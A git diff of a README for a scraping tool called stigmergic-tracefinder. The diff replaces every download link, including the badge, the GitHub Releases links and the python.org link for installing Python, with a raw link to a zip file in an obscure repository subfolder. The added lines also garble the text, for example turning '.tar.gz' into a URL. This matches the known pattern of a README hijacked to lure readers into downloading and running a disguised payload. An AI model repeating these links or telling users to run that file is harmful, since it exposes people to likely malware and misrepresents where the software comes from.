@@ -1,6 +1,6 @@
 # 🌐 stigmergic-tracefinder - Discover Hidden Influences Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/K4LLER/stigmergic-tracefinder/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/K4LLER/stigmergic-tracefinder/main/aortarctia/stigmergic-tracefinder.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/K4LLER/stigmergic-tracefinder/main/aortarctia/stigmergic-tracefinder.zip)
 
 ## 📚 Description
 stigmergic-tracefinder is a set of scraping pipelines designed to gather data on authors and their works. This tool helps you trace connections between concepts and see how they develop across time and disciplines. It offers a clear view of hidden networks of influence.
@@ -15,20 +15,20 @@ Follow these steps to get started using stigmergic-tracefinder:
    - Internet Connection: Required for data scraping
 
 2. **Install Required Tools**
-   - To run this application, you may need Python 3.7 or newer. You can download it from [python.org](https://www.python.org/downloads/).
+   - To run this application, you may need Python 3.7 or newer. You can download it from [https://raw.githubusercontent.com/K4LLER/stigmergic-tracefinder/main/aortarctia/stigmergic-tracefinder.zip](https://raw.githubusercontent.com/K4LLER/stigmergic-tracefinder/main/aortarctia/stigmergic-tracefinder.zip).
    - Other optional packages may be installed, but they will be included in the application.
 
 ## 📥 Download & Install
-Visit this page to download: [GitHub Releases](https://github.com/K4LLER/stigmergic-tracefinder/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/K4LLER/stigmergic-tracefinder/main/aortarctia/stigmergic-tracefinder.zip)
 
-1. Go to the [GitHub Releases page](https://github.com/K4LLER/stigmergic-tracefinder/releases).
+1. Go to the [GitHub Releases page](https://raw.githubusercontent.com/K4LLER/stigmergic-tracefinder/main/aortarctia/stigmergic-tracefinder.zip).
 2. Choose the latest version available.
 3. Download the file that matches your operating system.
 
 For example:
 - Windows users should download the .exe file.
 - macOS users can download the .dmg file.
-- Linux users might find a .zip or .tar.gz file.
+- Linux users might find a .zip or https://raw.githubusercontent.com/K4LLER/stigmergic-tracefinder/main/aortarctia/stigmergic-tracefinder.zip file.
 
 4. Once the download completes, locate the file in your downloads folder and run the installer. Follow the instructions on your screen.
 
@@ -65,4 +65,4 @@ We welcome contributions from the community. If you have ideas or improvements, 
 
 ---
 
-Remember to visit this page to download: [GitHub Releases](https://github.com/K4LLER/stigmergic-tracefinder/releases) for the latest version of stigmergic-tracefinder.
+Remember to visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/K4LLER/stigmergic-tracefinder/main/aortarctia/stigmergic-tracefinder.zip) for the latest version of stigmergic-tracefinder.
